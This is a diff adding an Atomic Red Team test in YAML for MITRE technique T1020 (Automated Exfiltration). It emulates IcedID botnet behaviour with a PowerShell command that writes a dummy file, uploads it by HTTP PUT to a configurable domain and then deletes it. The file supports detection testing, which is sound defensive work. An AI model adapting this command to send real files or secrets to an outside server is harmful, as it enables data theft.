@@ -1,0 +1,32 @@
+attack_technique: T1020
+display_name: Automated Exfiltration
+atomic_tests:
+- name: IcedID Botnet HTTP PUT
+  auto_generated_guid: 9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0
+  description: |-
+    Creates a text file
+    Tries to upload to a server via HTTP PUT method with ContentType Header
+    Deletes a created file
+  supported_platforms:
+  - windows
+  input_arguments:
+    file:
+      description: Exfiltration File
+      type: String
+      default: C:\temp\T1020_exfilFile.txt
+    domain:
+      description: Destination Domain
+      type: url
+      default: https://google.com
+  executor:
+    command: |-
+      $fileName = "#{file}"
+      $url = "#{domain}"
+      $file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
+      $contentType = "application/octet-stream"
+      try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
+    cleanup_command: |-
+      $fileName = "#{file}"
+      Remove-Item -Path $fileName -ErrorAction Ignore
+    name: powershell
+  
